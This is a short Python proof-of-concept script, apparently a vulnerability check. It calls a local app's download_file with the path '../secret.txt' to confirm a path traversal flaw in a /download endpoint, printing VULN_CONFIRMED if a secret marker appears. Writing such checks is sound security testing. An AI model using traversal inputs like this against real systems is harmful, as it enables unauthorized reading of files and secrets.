"""验证 /download 的路径穿越。成功时输出 VULN_CONFIRMED。"""

from __future__ import annotations

import os
import sys

SRC_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, SRC_DIR)

import app  # noqa: E402


def main() -> int:
    content = app.download_file("../secret.txt").decode("utf-8", errors="replace")
    print(f"content={content.strip()}")
    if "TOP_SECRET" in content:
        print("VULN_CONFIRMED")
        return 0
    print("path traversal not confirmed")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
